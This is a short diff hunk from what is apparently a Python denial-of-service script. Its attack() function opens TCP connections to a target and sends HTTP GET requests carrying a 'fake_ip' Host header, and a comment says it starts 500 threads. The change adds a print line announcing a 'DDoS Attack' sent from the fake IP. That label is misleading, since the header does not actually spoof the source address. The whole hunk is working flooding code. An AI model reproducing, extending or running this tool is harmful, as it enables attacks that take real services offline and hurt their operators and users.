@@ -28,6 +28,7 @@ def attack():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target, port))
     s.sendto(f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode(), (target, port))
+    print(f"[*] DDoS Attack sent to {target}:{port} originating from {fake_ip}")
     s.close()
 
 # Start 500 threads to run the attack
